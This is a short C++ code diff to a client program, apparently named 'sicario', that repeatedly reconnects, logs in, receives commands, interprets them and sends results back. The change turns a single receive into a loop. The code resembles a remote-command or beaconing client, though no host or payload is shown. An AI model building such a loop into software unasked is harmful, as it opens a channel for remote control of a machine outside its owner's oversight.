@@ -9,7 +9,6 @@
 
 #include "sicarioClient.h"
 
-
 // Warning: Platform-specific!
 void sleepFor(unsigned long long seconds) {
     sleep(seconds);
@@ -26,11 +25,12 @@ int main(int argc, char** argv) {
         sleepFor(client.connInterval);
         client.reconnect();
         client.loginUser(client.userKey);
-        std::string data = client.receiveData();
-        if(data != "") {
+        std::string data = "";
+        do {
+            data = client.receiveData();
             std::string result = client.interpretCommand(data);
             client.sendData(result);
-        }
+        } while(data != "");
         client.disconnect();
     }
 }
